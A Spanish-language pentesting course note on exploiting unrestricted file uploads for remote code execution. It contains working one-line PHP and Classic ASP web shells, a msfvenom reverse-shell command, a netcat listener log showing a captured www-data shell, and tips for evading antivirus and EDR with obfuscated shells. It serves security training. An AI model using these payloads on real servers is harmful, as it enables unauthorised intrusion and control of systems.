---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - File-Upload
Fecha de actualización: 2026-06-21
Nota previa: "[[00 - Introducción a los File Upload Attacks]]"
Nota siguiente: "[[02 - Bypass de validación en cliente]]"
Area: "[[File Upload.base|File Upload]]"
---
---

El caso más simple de file upload es el que <mark style="background: #ADCCFFA6;">no aplica validación alguna</mark>: la app acepta cualquier extensión y contenido por defecto. Con eso, el camino a RCE es directo —subir un script en el lenguaje del servidor y visitarlo— pero esconde dos decisiones que conviene dominar: **en qué lenguaje escribir el payload** y **qué tipo de payload usar** (web shell o reverse shell). Esta nota cubre la explotación de la subida arbitraria de extremo a extremo.

# Identificar el lenguaje del servidor

Un web shell ejecuta funciones específicas del intérprete, así que <mark style="background: #FFB8EBA6;">debe estar escrito en el mismo lenguaje que corre el back-end</mark>. Primer paso antes de subir nada: averiguar ese lenguaje.

- **Extensión en la URL**: `login.php`, `index.aspx`… delatan el stack. Pero los frameworks con *routing* (Laravel, Express, Django, Rails) ocultan la extensión, así que su ausencia no significa nada.
- **`/index.ext`**: visitar `index.php`, `index.aspx`, `index.jsp`… y ver cuál responde igual que la home. Automatizable con `ffuf`/Intruder y la wordlist [web-extensions.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) de SecLists.
- **Cabeceras**: `Server:` y `X-Powered-By:` suelen filtrar `PHP/8.x`, `ASP.NET`, etc.
- **[Wappalyzer](https://www.wappalyzer.com)** o **[whatweb](https://github.com/urbanadventurer/WhatWeb)**: fingerprinting de tecnologías (servidor, lenguaje, SO, framework) de un vistazo.

> [!warning]+ El fichero subido puede no ser accesible
> En apps con routing, los uploads quizá **no se sirven desde una URL directa** ni ejecutan código (se guardan en S3/CDN, o el dominio que los sirve no tiene intérprete). Antes de invertir en un web shell, confirma que el fichero subido es **alcanzable y ejecutable**. Si no lo es, el RCE clásico no aplica y pivotas a [[06 - Uploads limitados - SVG, polyglots y metadatos|vectores secundarios]].

Para confirmar que se ejecuta código antes de subir un shell completo, sube una prueba mínima —`<?php echo "test-" . (7*7); ?>`— y comprueba si la respuesta muestra `test-49` (ejecuta) o el código fuente literal (no ejecuta).

# Web shells

<mark style="background: #ADCCFFA6;">Un web shell es un script que acepta comandos por HTTP y devuelve su salida en el navegador</mark>, dando una shell semi-interactiva sobre el servidor. Opciones:

- **Listos para usar**: [phpbash](https://github.com/Arrexel/phpbash) (terminal semi-interactiva en una sola página PHP), o la colección de [SecLists/Web-Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) para múltiples lenguajes (en PwnBox: `/opt/useful/seclists/Web-Shells`).
- **Custom mínimo en PHP** —imprescindible cuando no hay acceso a herramientas externas:

```php
<?php system($_REQUEST['cmd']); ?>
```

`$_REQUEST` acepta el parámetro `cmd` por `GET`, `POST` o cookie, así que `shell.php?cmd=id` ejecuta `id`. En **Classic ASP** (IIS legacy, VBScript) el equivalente es:

```asp
<% eval request("cmd") %>
```

Ese payload es **Classic ASP**, no ASP.NET — no compila en un `.aspx` moderno (que es C#/VB.NET). Contra un stack .NET real (la mayoría hoy), el web shell va en C#/VB.NET: lo práctico es usar **Antak** (ver abajo) o un `.aspx` con `System.Diagnostics.Process.Start`.

> [!tip]+ Ver la salida en crudo
> Con un web shell mínimo en el navegador, usa **source-view** (`CTRL+U`): muestra la salida del comando sin que el HTML la reformatee.

En un engagement real, los web shells clásicos tienen un problema: <mark style="background: #FFB86CA6;">los AV/EDR y los WAF detectan firmas conocidas como `system(`, `eval(` o el propio `phpbash`</mark>. Alternativas modernas más sigilosas:

- **[weevely](https://github.com/epinna/weevely3)**: genera un web shell PHP **cifrado y ofuscado** (`weevely generate <pass> shell.php`) que evade firmas básicas y trae +30 módulos de post-explotación. Es el estándar cuando el AV molesta.
- **[p0wny-shell](https://github.com/flozz/p0wny-shell)**: web shell PHP de un solo fichero, ligera y con prompt cómodo.
- **[antak](https://github.com/samratashok/nishang)** (Nishang): web shell ASPX con aspecto de PowerShell, para stacks Windows/.NET.

> [!info]+ Sub-tema dedicado
> El despliegue de web shells (Laudanum, Antak, PHP), su [[08 - Shells interactivas - upgrade a TTY|estabilización]] a shell interactiva y su [[11 - Detección, prevención y evasión|detección/evasión]] se cubren a fondo en el sub-tema [[Shells y Payloads.base|Shells y Payloads]] del path CPTS. Aquí las vemos en el contexto concreto de una subida de archivos.

# Reverse shells

Una reverse shell fuerza al servidor a conectarse de vuelta a nuestro listener, dando una sesión más interactiva. Flujo:

1. Descargar un script en el lenguaje del objetivo —p. ej. [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)— y poner nuestra `IP` y `PORT` (las variables `$ip` y `$port`, cerca del inicio del script).
2. Levantar el listener: `nc -lvnp <PORT>`.
3. Subir el script y visitarlo para disparar la conexión.

```shell-session
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.5] from (UNKNOWN) [10.129.x.x] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<mark style="background: #FF5582A6;">El `uid=33(www-data)` confirma que corremos como el usuario del servicio web</mark> —punto de partida para enumerar y escalar. Para generar el payload en cualquier lenguaje, dos vías modernas:

- **`msfvenom`**: `msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > reverse.php` (para una sesión Meterpreter interactiva en vez de una shell básica, usa `-p php/meterpreter/reverse_tcp`). Cambia `-p` y `-f` para otros lenguajes/formatos.
- **[revshells.com](https://www.revshells.com/)**: generador interactivo (bash, nc, Python, PowerShell, PHP, `msfvenom`) con el comando listo para pegar y el listener correspondiente. Es la referencia rápida hoy.

Tras recibir la shell, estabilízala (`python3 -c 'import pty; pty.spawn("/bin/bash")'`, luego `CTRL+Z`, `stty raw -echo; fg`) para tener una TTY usable.

# Web shell o reverse shell: cuál

| | Web shell | Reverse shell |
| - | - | - |
| Interactividad | Semi (request por comando) | Alta (TTY completa) |
| Requisito de red | Solo el puerto web entrante | **Conexión saliente** del servidor a ti |
| Persistencia | Fichero en el servidor | Se cae al cerrar el proceso |
| Cuándo falla | `disable_functions`, WAF | **Firewall de egress**, funciones de red deshabilitadas |

<mark style="background: #8000E1A6;">La reverse shell es preferible por interactividad, pero depende de que el servidor pueda salir hacia ti.</mark> En redes con egress filtrado (lo normal en producción seria) esa conexión no sale y hay que caer al web shell. Llevar ambos preparados es lo sensato.

> [!warning]+ Gotchas de producción
> - **`disable_functions`** en `php.ini` (`system`, `exec`, `shell_exec`, `passthru` deshabilitadas) tumba el web shell clásico. Hay bypasses (`proc_open`, FFI, `mail`+`LD_PRELOAD`), pero quedan fuera de este módulo.
> - Los payloads de `msfvenom` por defecto tienen firma conocida: un **EDR** en el servidor los caza. Genera con encoders o usa shells custom.
> - Si el upload acaba en un **bucket sin ejecución**, ningún shell correrá: replantea hacia XSS/XXE/SSRF.

> [!info]+ Fuentes
> - [pentestmonkey — php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) · [revshells.com](https://www.revshells.com/)
> - [weevely3](https://github.com/epinna/weevely3) · [p0wny-shell](https://github.com/flozz/p0wny-shell) · [SecLists/Web-Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)
> - [PortSwigger — Web shells](https://portswigger.net/web-security/file-upload#how-web-shells-work)

Casi ninguna app real deja la subida sin validación. La defensa más básica —y más fácil de saltar— vive en el navegador: [[02 - Bypass de validación en cliente]].
